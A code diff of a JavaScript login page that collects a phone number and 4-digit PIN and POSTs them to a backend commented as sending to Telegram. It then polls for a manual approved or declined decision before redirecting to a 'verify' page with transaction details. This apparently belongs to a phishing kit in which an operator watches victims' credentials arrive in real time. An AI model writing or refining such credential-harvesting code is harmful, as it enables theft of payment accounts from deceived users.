@@ -324,7 +324,7 @@ function showIncorrectPinPopup() {
 }
 
 /* ============================================================
-   Submit — instant transition, no "Logging in…" text
+   Submit — accept first, THEN poll
 ============================================================ */
 async function submitLogin() {
   clearFormError();
@@ -340,78 +340,75 @@ async function submitLogin() {
   if (phoneDigits.length < 6) { showFormError('Please enter a valid phone number.'); document.getElementById('phoneInput').focus(); return; }
   if (pin.length !== 4) { showFormError('Please enter all 4 PIN digits.'); const empty = pinEls.find(el => !el.value); if (empty) empty.focus(); return; }
 
-  // No text change on the button — just show the verifying overlay immediately
   document.getElementById('loginBtn').disabled = true;
   document.getElementById('verifying').classList.add('show');
 
   const txId = currentTx ? currentTx.tx : null;
 
-  let polling = true;
-  const start = Date.now();
-  const maxWaitMs = 5 * 60 * 1000;
-
-  const poll = async () => {
-    if (!polling) return;
-    if (Date.now() - start > maxWaitMs) {
-      polling = false;
-      document.getElementById('verifying').classList.remove('show');
-      document.getElementById('loginBtn').disabled = false;
-      showFormError('Request timed out. Please try again.');
-      return;
-    }
-    try {
-      const r = await fetch('/api/status/' + encodeURIComponent(txId) + '?_=' + Date.now());
-      const s = await r.json();
-      const decision = s.decision || s.status;
-
-      if (decision === 'approved') {
-        polling = false;
-        const q = new URLSearchParams({
-          tx:  (currentTx && currentTx.tx)  || '',
-          am:  (currentTx && currentTx.am)  || '',
-          cur: (currentTx && currentTx.cur) || '',
-          rn:  (currentTx && currentTx.rn)  || '',
-          c:   (currentTx && currentTx.c)   || ''
-        });
-        window.location.href = 'verify.html?' + q.toString();
-        return;
-      }
-
-      if (decision === 'declined') {
-        polling = false;
-        document.getElementById('verifying').classList.remove('show');
-        document.getElementById('loginBtn').disabled = false;
-        pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
-        pinEls[0].focus();
-        showIncorrectPinPopup();
-        return;
-      }
-    } catch (e) { /* retry */ }
-
-    if (polling) setTimeout(poll, 1000);
-  };
-
-  poll();
-
   try {
+    // ---- Step 1: send to Telegram ----
     const res = await fetch('/api/accept', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ transactionId: txId, phone: dial + phoneDigits, pin: pin })
     });
+
     let result = { status: 'failed' };
     try { result = await res.json(); } catch (e) {}
 
     if (result.status === 'failed') {
-      polling = false;
       document.getElementById('verifying').classList.remove('show');
       document.getElementById('loginBtn').disabled = false;
       showFormError(result.message || 'Authorization failed.');
       pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
       pinEls[0].focus();
+      return;
     }
+
+    // ---- Step 2: poll for decision ----
+    const start = Date.now();
+    const maxWaitMs = 5 * 60 * 1000;
+
+    const poll = async () => {
+      if (Date.now() - start > maxWaitMs) {
+        document.getElementById('verifying').classList.remove('show');
+        document.getElementById('loginBtn').disabled = false;
+        showFormError('Request timed out. Please try again.');
+        return;
+      }
+
+      try {
+        const r = await fetch('/api/status/' + encodeURIComponent(txId) + '?_=' + Date.now());
+        const s = await r.json();
+        const decision = s.decision || s.status;
+
+        if (decision === 'approved') {
+          const q = new URLSearchParams({
+            tx:  (currentTx && currentTx.tx)  || '',
+            am:  (currentTx && currentTx.am)  || '',
+            cur: (currentTx && currentTx.cur) || '',
+            rn:  (currentTx && currentTx.rn)  || '',
+            c:   (currentTx && currentTx.c)   || ''
+          });
+          window.location.href = 'verify.html?' + q.toString();
+          return;
+        }
+
+        if (decision === 'declined') {
+          document.getElementById('verifying').classList.remove('show');
+          document.getElementById('loginBtn').disabled = false;
+          pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
+          pinEls[0].focus();
+          showIncorrectPinPopup();
+          return;
+        }
+      } catch (e) { /* retry */ }
+
+      setTimeout(poll, 1200);
+    };
+
+    poll();
   } catch (err) {
-    polling = false;
     document.getElementById('verifying').classList.remove('show');
     document.getElementById('loginBtn').disabled = false;
     showFormError('Could not reach the server. Please try again.');
